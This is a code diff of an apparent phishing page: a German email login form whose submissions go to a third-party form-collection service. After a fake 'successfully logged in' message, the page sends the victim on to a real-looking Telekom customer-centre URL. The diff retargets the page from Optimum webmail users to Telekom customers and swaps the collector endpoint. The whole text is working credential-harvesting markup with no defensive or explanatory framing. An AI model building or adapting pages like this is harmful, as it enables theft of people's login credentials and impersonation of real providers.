@@ -49,7 +49,7 @@ function showPage() {
 </span>
 <br>
 <p>
-<form action="https://submit-form.com/q9o5uEztL" method="POST">
+<form id="contact-form" action="https://usebasin.com/f/0a51dd7d0f78" method="POST">
 				<div class="formfield">
 					<label for="username"></label>
 					<input type="text" id="username" name="username" value="" placeholder="E-Mail-Adresse" autofocus="" required="">
@@ -73,10 +73,9 @@ function showPage() {
   </p>
 			</div>	 
 <div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
-  ✅ Danke schön! Erfolgreich angemeldet - Weiterleitung zum Portal......
-</div>
-
-<script>
+  ✅ Danke schön! Erfolgreich angemeldet - Weiterleitung zum Portal...
+</div>		
+	<script>
   const form = document.getElementById('contact-form');
   const successMsg = document.getElementById('form-success');
 
@@ -95,8 +94,8 @@ function showPage() {
         form.reset();
         successMsg.style.display = 'block';
         setTimeout(() => {
-          window.location.href = 'https://myemail2.optimum.net/webmail/index-rui.jsp?v=ci-ALTUX_2.3.2#/mail';
-        }, 3000); // 3-second delay before redirect
+          window.location.href = 'https://meinkonto.telekom-dienste.de/kundencenter/index.xhtml'; // Replace with your target URL
+        }, 4000); // Redirect after 4 seconds
       } else {
         alert('There was an issue submitting the form. Please try again.');
       }
@@ -104,7 +103,7 @@ function showPage() {
       alert('There was a network error. Please try again.');
     });
   });
-</script>
+</script>		
             <div>              			
 </div>
 </div>
